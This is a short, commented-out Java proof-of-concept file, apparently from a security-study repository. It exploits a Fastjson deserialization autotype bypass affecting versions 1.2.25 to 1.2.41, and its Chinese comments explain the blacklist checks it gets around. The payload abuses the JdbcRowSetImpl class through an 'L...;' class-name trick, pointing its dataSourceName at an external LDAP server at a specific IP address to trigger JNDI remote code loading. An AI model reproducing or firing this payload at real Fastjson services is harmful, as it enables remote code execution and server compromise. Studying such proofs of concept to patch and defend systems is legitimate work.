//package JdbcRowSetImpl;
//
//import com.alibaba.fastjson.JSON;
//import com.alibaba.fastjson.parser.ParserConfig;
//
////1.2.25-1.2.41 绕过
//public class exp1 {
//    public static void main(String[] args) {
//        // 1.自从1.2.25 起 autotype 默认为False
//        //2.增加 checkAutoType 方法，在该方法中进行黑名单校验，同时增加白名单机制Fastjson AutoType说明
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String PoC = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"ldap://101.34.84.157:8085/zPnvpHcF\", \"autoCommit\":true}";
//        JSON.parse(PoC);
//    }
//}
